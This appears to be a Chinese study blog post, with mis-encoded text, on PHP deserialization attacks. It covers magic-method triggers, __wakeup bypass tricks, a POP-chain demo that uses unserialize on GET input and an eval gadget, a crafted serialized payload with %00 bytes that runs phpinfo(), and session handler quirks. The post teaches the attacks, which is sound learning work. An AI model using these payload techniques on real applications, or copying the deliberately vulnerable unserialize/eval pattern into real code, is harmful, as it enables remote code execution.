<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰ååºåˆ—åŒ–åè°ƒç”¨çš„æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user_ser</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>));</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>#1 (4) </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$username</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$nickname</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;b&quot;</span></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$password</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$order</span> =&gt;</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æ‰§è¡Œååºåˆ—åŒ–ä¹‹å‰ä¼šå…ˆæ‰§è¡Œ<strong>wakeup()å‡½æ•°ï¼Œä¸Šé¢</strong>wakeupçš„å‡½æ•°ä½œç”¨æ˜¯å°†usernameçš„å˜é‡å€¼èµ‹å€¼ç»™passwordå˜é‡ã€‚</p>
<hr>
<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h4><p><strong>__toString()</strong> æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚ echo $obj; åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚æ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™å°†å‘å‡ºä¸€æ¡ E_RECOVERABLE_ERROR çº§åˆ«çš„è‡´å‘½é”™è¯¯ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&#x27;__toString test&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__toString test</span><br></pre></td></tr></table></figure>

<p>ç‰¹åˆ«æ³¨æ„__toStringçš„è§¦å‘æ¡ä»¶ï¼Œå¼•ç”¨k0rz3nå¸ˆå‚…çš„ç¬”è®°ï¼š</p>
<blockquote>
<p>(1)echo ($obj) &#x2F; print($obj) æ‰“å°æ—¶ä¼šè§¦å‘ (2)ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿æ¥æ—¶ (3)ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶ (4)ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿›è¡Œ&#x3D;&#x3D;æ¯”è¾ƒæ—¶ï¼ˆPHPè¿›è¡Œ&#x3D;&#x3D;æ¯”è¾ƒçš„æ—¶å€™ä¼šè½¬æ¢å‚æ•°ç±»å‹ï¼‰ (5)ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–SQLè¯­å¥ï¼Œç»‘å®šå‚æ•°æ—¶ (6)ååºåˆ—åŒ–å¯¹è±¡åœ¨ç»è¿‡phpå­—ç¬¦ä¸²å‡½æ•°ï¼Œå¦‚ strlen()ã€addslashes()æ—¶ (7)åœ¨in_array()æ–¹æ³•ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ååºåˆ—åŒ–å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„æ•°ç»„ä¸­æœ‰toStringè¿”å›çš„å­—ç¬¦ä¸²çš„æ—¶å€™toStringä¼šè¢«è°ƒç”¨ (8)ååºåˆ—åŒ–çš„å¯¹è±¡ä½œä¸º class_exists() çš„å‚æ•°çš„æ—¶å€™</p>
</blockquote>
<hr>
<h4 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h4><p>å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ<code>__invoke()</code> æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚(æœ¬ç‰¹æ€§åªåœ¨ PHP 5.1.0 åŠä»¥ä¸Šç‰ˆæœ¬æœ‰æ•ˆã€‚)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;__invoke test&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>();</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__invoke test</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="clone"><a href="#clone" class="headerlink" title="__clone"></a>__clone</h4><p>å½“ä½¿ç”¨ clone å…³é”®å­—æ‹·è´å®Œæˆä¸€ä¸ªå¯¹è±¡åï¼Œæ–°å¯¹è±¡ä¼šè‡ªåŠ¨è°ƒç”¨å®šä¹‰çš„é­”æœ¯æ–¹æ³• <code>__clone()</code> ï¼Œå¦‚æœè¯¥é­”æœ¯æ–¹æ³•å­˜åœ¨çš„è¯ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__clone test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">clone</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__clone test</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="wakeup-å‡½æ•°ç»•è¿‡æ¼æ´åŸç†"><a href="#wakeup-å‡½æ•°ç»•è¿‡æ¼æ´åŸç†" class="headerlink" title="__wakeup()å‡½æ•°ç»•è¿‡æ¼æ´åŸç†"></a>__wakeup()å‡½æ•°ç»•è¿‡æ¼æ´åŸç†</h3><h4 id="1-ä½ç‰ˆæœ¬çš„php"><a href="#1-ä½ç‰ˆæœ¬çš„php" class="headerlink" title="1.ä½ç‰ˆæœ¬çš„php"></a>1.ä½ç‰ˆæœ¬çš„php</h4><blockquote>
<p><code>å½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œã€‚</code></p>
<p><code>ä»è€Œç»•è¿‡äº†__wakeup()å‡½æ•°</code></p>
</blockquote>
<h4 id="2-é«˜ä¸€äº›çš„ç‰ˆæœ¬"><a href="#2-é«˜ä¸€äº›çš„ç‰ˆæœ¬" class="headerlink" title="2.é«˜ä¸€äº›çš„ç‰ˆæœ¬"></a>2.é«˜ä¸€äº›çš„ç‰ˆæœ¬</h4><p>ä¸¾ä¸ªä¾‹å­ï¼Œ</p>
<blockquote>
<p><code>C:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
</blockquote>
<p>å…³é”®æ˜¯æŠŠ<code>O:</code>æ”¹æˆ<code>C:</code>ï¼Œ</p>
<p><strong>åŸç†æ˜¯</strong></p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">C:</span>ä»£è¡¨è¿™ä¸ªç±»å®ç°äº†serializeableæ¥å£ï¼Œè€Œserializeableä¸æ”¯æŒ__wakeupï¼Œå°±ç»•è¿‡å»äº†</span><br></pre></td></tr></table></figure>

<h3 id="popchain"><a href="#popchain" class="headerlink" title="*popchain"></a>*popchain</h3><blockquote>
<p>å®é™…ç¯å¢ƒä¸­ä¸å¯èƒ½å­˜åœ¨ç›´æ¥ååºåˆ—åŒ–å°±èƒ½å®ç°å‘½ä»¤æ‰§è¡Œçš„æƒ…å†µï¼Œè¿™ä¸ªæ—¶å€™å°±è¦ç”¨åˆ°æˆ‘ä»¬åˆšå­¦åˆ°çš„ä¸€äº›<code>é­”æœ¯æ–¹æ³•</code>çš„ç›¸äº’è§¦å‘ï¼Œæ¥æ„é€ ä¸€æ¡popchainï¼Œä»ååºåˆ—åŒ–æ¥å£å¼€å§‹ï¼Œ<strong>ä¸€çº§ä¸€çº§çš„è§¦å‘</strong>ã€æ‰€ä»¥å°±éœ€è¦æ¸…æ¥šå„ä¸ªé­”æœ¯æ–¹æ³•çš„è§¦å‘æƒ…å†µã€‘ï¼Œæœ€ç»ˆåˆ°è¾¾æˆ‘ä»¬ç›®çš„æƒ³è¦æ‰§è¡Œçš„<code>æ–¹æ³•/å‡½æ•°</code></p>
</blockquote>
<hr>
<h3 id="ä¸ªäºº-ä¸€äº›æ–‡ç« å¯¹-phpååºåˆ—åŒ–çš„ä¸€äº›è®¤çŸ¥"><a href="#ä¸ªäºº-ä¸€äº›æ–‡ç« å¯¹-phpååºåˆ—åŒ–çš„ä¸€äº›è®¤çŸ¥" class="headerlink" title="*ä¸ªäºº+ä¸€äº›æ–‡ç« å¯¹ phpååºåˆ—åŒ–çš„ä¸€äº›è®¤çŸ¥"></a>*ä¸ªäºº+ä¸€äº›æ–‡ç« å¯¹ phpååºåˆ—åŒ–çš„ä¸€äº›è®¤çŸ¥</h3><p>ä¸¾ä¾‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">normal</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please attack me&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>æ­£å¸¸å®ä¾‹åŒ–åä¼šæ‰§è¡Œ<code>normal</code>ç±»é‡Œé¢çš„<code>action</code>æ–¹æ³•ï¼Œä½†æ˜¯<code>unserialize</code>å‡½æ•°æ˜¯å¯æ§çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯¹å…¶è¿›è¡Œæ”»å‡»ï¼Œæ€è·¯å°±æ˜¯æ”¹å˜<code>index</code>ç±»é‡Œé¢<code>test</code>å±æ€§çš„å€¼ï¼Œè®©å®ƒå®ä¾‹åŒ–<code>evil</code>ç±»ï¼Œä»è€Œæ‰§è¡Œ<code>evil</code>é‡Œé¢çš„<code>action</code>æ–¹æ³•ï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿè¦ä¿®æ”¹<code>evil</code>ç±»é‡Œé¢çš„<code>test2</code>å±æ€§çš„å€¼</p>
<hr>
<p>å› ä¸º<code>ç±»ä¸åŒäºå‡½æ•°</code>ï¼Œ<code>å®šä¹‰å®Œä¹‹åæ— æ³•ç›´æ¥ä½¿ç”¨</code>ï¼Œå› ä¸ºç±»<code>åªæ˜¯ä¸€ä¸ªæŠ½è±¡çš„æ¦‚å¿µ</code>ï¼Œ<u><strong>éœ€è¦é€šè¿‡å…³é”®å­—newæ¥å®ä¾‹åŒ–ç±»ï¼Œæ‰å¯ä»¥ä½¿ç”¨</strong></u>ã€‚ç±»å®ä¾‹åŒ–çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š<strong>å˜é‡å&#x3D;new ç±»åï¼ˆ[æ„é€ å‡½æ•°]ï¼‰</strong>ã€‚</p>
<p>å…¶ä¸­ï¼Œå˜é‡åå¯ä»¥ä¸º<strong>ä»»ä½•PHPå˜é‡çš„åç§°</strong>ï¼Œæ„é€ å‚æ•°å–å†³äº<strong>ç±»çš„æ„é€ å‡½æ•°</strong>ï¼Œè‹¥<strong>æ— æ„é€ å‡½æ•°ï¼Œåˆ™åœ†æ‹¬å·ä¸­ä¸ºç©º</strong>ã€‚</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">å®ä¾‹åŒ–ä¸€ä¸ªç±»åå³å¯ä½¿ç”¨è¯¥ç±»</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;serialize1.txt&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>è¿™é‡ŒååºåŒ–çš„ï¼Œå…ˆæ˜¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br></pre></td></tr></table></figure>

<p>å®ä¾‹åŒ–index()ç±»ï¼Œç„¶åè°ƒåŠ¨å…¶<code>test</code>å˜é‡å®ä¾‹åŒ–<code>evil)()</code>ï¼Œ</p>
<p>ä½¿å…¶èƒ½å¤Ÿè¢«è°ƒç”¨ï¼Œç„¶åæ ¹æ®</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯¹<code>test2</code>å˜é‡è¿›è¡Œèµ‹å€¼å‘½ä»¤è¯­å¥ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å…¶ä¸­çš„<code>eval</code>å‡½æ•°ï¼Œæ‰§è¡Œä¸€äº›å‘½ä»¤æ¥æ‹¿åˆ°æˆ‘ä»¬æ‰€éœ€è¦çš„å†…å®¹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable">$test2</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>æœ€åå¯¹åºåˆ—åŒ–çš„<strong>å…¥å£ç±»</strong>(<code>index.php</code>)åºåˆ—åŒ–ï¼Œç„¶åæŠŠåºåˆ—åŒ–ç»“æœå¯¼å…¥ï¼Œå†ç”±æºç ä¸­ååºåˆ—åŒ–å‡½æ•°åï¼Œä»è€Œå®ç°æˆ‘ä»¬æƒ³è¦çš„ç»“æ„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>æ¯”å¦‚è¿™é‡Œå°±æ˜¯ä»¥<code>GET</code>æ–¹å¼ä¼ å‚<code>test</code>å‚æ•°ï¼Œ</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">url/?<span class="attribute">test</span>=åºåˆ—åŒ–ç»“æœ</span><br></pre></td></tr></table></figure>

<p><strong>ä½†æ˜¯åºåˆ—åŒ–çš„ç»“æœæœªå¿…éƒ½æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œå› ä¸º<code>%00</code>è¿™ä¸ªç©ºå­—ç¬¦æ˜¯æ— æ³•æ˜¾ç¤ºï¼Œåªèƒ½è¾“å…¥è¿›å»</strong></p>
<p>ä»¥ä¸Šé¢ä¸ºä¾‹å­ï¼Œåºåˆ—åŒ–åç»“æœä¸º</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">5</span>:<span class="string">&quot;index&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;indextest&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;test2&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœç”¨äº†è¿™ä¸ªæ˜¯ä¼šæŠ¥é”™çš„ï¼Œ</p>
<p><img src="/post/Web-study/image-20220927091524021.png" alt="image-20220927091524021"></p>
<p>å› ä¸ºè¿™é‡Œçš„å‚æ•°æœ‰é—®é¢˜</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">&#123;<span class="variable">s:11</span>:<span class="string">&quot;indextest&quot;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ä»”ç»†çœ‹ä¸€ä¸‹å±æ€§å€¼æ˜¯<code>11</code>ï¼Œä½†æ˜¯åé¢çš„<code>indextest</code>æ€»å…±æ˜¯<code>9</code>ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥ä¸¢å¤±äº†ä¸¤ä¸ªå­—ç¬¦ï¼Œè¿™ä¸¤ä¸ªå­—ç¬¦å°±æ˜¯ç©ºå­—ç¬¦<code>%00</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">5</span>:<span class="string">&quot;index&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;index%00test%00&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;test2&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘ä»¬åŠ ä¸Šåå†è¯•è¯•</p>
<p><img src="/post/Web-study/image-20220927091556911.png" alt="image-20220927091556911"></p>
<p>å°±å®ç°äº†æˆ‘ä»¬çš„ç›®çš„æ“ä½œ</p>
<p>å½“ç„¶å…¶å®è¿˜å¯èƒ½æœ‰çš„æƒ…å†µåé¢ä¸æ˜¯<code>eval()</code>çš„å‘½ä»¤æ‰§è¡Œï¼Œå¯èƒ½æ˜¯æ–‡ä»¶åŒ…å«ï¼Œæˆ–è€…å…¶ä»–æ“ä½œï¼ŒæŒ‰è¿™ç§æ€è·¯èµ°å¤§éƒ½æ˜¯æ²¡æœ‰é—®é¢˜çš„</p>
<h3 id="sessionçš„ååºåˆ—åŒ–æ¼æ´"><a href="#sessionçš„ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="sessionçš„ååºåˆ—åŒ–æ¼æ´"></a>sessionçš„ååºåˆ—åŒ–æ¼æ´</h3><figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">sessionçš„ååºåˆ—åŒ–æ¼æ´ï¼Œå°±æ˜¯åˆ©ç”¨`php`å¤„ç†å™¨å’Œ`php_serialize`å¤„ç†å™¨çš„å­˜å‚¨æ ¼å¼å·®å¼‚è€Œäº§ç”Ÿï¼Œé€šè¿‡å…·ä½“çš„ä»£ç æˆ‘ä»¬æ¥çœ‹ä¸‹æ¼æ´å‡ºç°çš„åŸå› </span><br></pre></td></tr></table></figure>



<h4 id="PHP-sessionåºåˆ—åŒ–æœºåˆ¶"><a href="#PHP-sessionåºåˆ—åŒ–æœºåˆ¶" class="headerlink" title="PHP sessionåºåˆ—åŒ–æœºåˆ¶"></a>PHP sessionåºåˆ—åŒ–æœºåˆ¶</h4><p>æ ¹æ®<code>php.ini</code>ä¸­çš„é…ç½®é¡¹ï¼Œæˆ‘ä»¬ç ”ç©¶å°†<code>$_SESSION</code>ä¸­ä¿å­˜çš„æ‰€æœ‰æ•°æ®åºåˆ—åŒ–å­˜å‚¨åˆ°<code>PHPSESSID</code>å¯¹åº”çš„æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨çš„ä¸‰ç§ä¸åŒçš„å¤„ç†æ ¼å¼ï¼Œå³<code>session.serialize_handler</code>å®šä¹‰çš„ä¸‰ç§å¼•æ“ï¼š</p>
<table>
<thead>
<tr>
<th align="center">å¤„ç†å™¨</th>
<th align="center">å¯¹åº”çš„å­˜å‚¨æ ¼å¼</th>
</tr>
</thead>
<tbody><tr>
<td align="center">php</td>
<td align="center">é”®å ï¼‹ ç«–çº¿ ï¼‹ ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td align="center">php_binary</td>
<td align="center">é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ ï¼‹ é”®å ï¼‹ ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td align="center">php_serialize (php&gt;&#x3D;5.5.4)</td>
<td align="center">ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„æ•°ç»„</td>
</tr>
</tbody></table>
<h5 id="phpå¤„ç†å™¨"><a href="#phpå¤„ç†å™¨" class="headerlink" title="phpå¤„ç†å™¨"></a>phpå¤„ç†å™¨</h5><p>é¦–å…ˆæ¥çœ‹çœ‹é»˜è®¤<code>session.serialize_handler = php</code>æ—¶å€™çš„åºåˆ—åŒ–ç»“æœï¼Œä»£ç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20220311/1646988663_622b0d779748192aba6f7.png!small" alt="img"></p>
<p>ä¸ºäº†æ–¹ä¾¿æŸ¥çœ‹ï¼Œå°†<code>session</code>å­˜å‚¨ç›®å½•è®¾ç½®ä¸º<code>session.save_path = &quot;/www/php_session&quot;</code>ï¼Œ<code>PHPSESSID</code>æ–‡ä»¶å¦‚ä¸‹</p>
<p>1ã€æ–‡ä»¶å</p>
<p>æ–‡ä»¶åä¸º<code>sess_mpnnbont606f50eb178na451od</code>ï¼Œå…¶ä¸­<code>mpnnbont606f50eb178na451od</code>å°±æ˜¯åç»­è¯·æ±‚å¤´ä¸­<code>Cookie</code>æºå¸¦çš„<code>PHPSESSID</code>çš„å€¼ (å¦‚ä¸Šå›¾æµè§ˆå™¨ä¸­å·²å­˜å‚¨)</p>
<p>2ã€æ–‡ä»¶å†…å®¹</p>
<p>phpå¤„ç†å™¨å­˜å‚¨æ ¼å¼</p>
<table>
<thead>
<tr>
<th align="center">é”®å</th>
<th align="center">ç«–çº¿</th>
<th align="center">ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$_SESSION[â€˜nameâ€™]çš„é”®åï¼šname</td>
<td align="center">|</td>
<td align="center">s:6:â€hardenâ€;</td>
</tr>
</tbody></table>
<h5 id="php-binaryå¤„ç†å™¨"><a href="#php-binaryå¤„ç†å™¨" class="headerlink" title="php_binaryå¤„ç†å™¨"></a>php_binaryå¤„ç†å™¨</h5><p>ä½¿ç”¨php_binaryå¤„ç†å™¨ï¼Œå³<code>session.serialize_handler = php_binary</code></p>
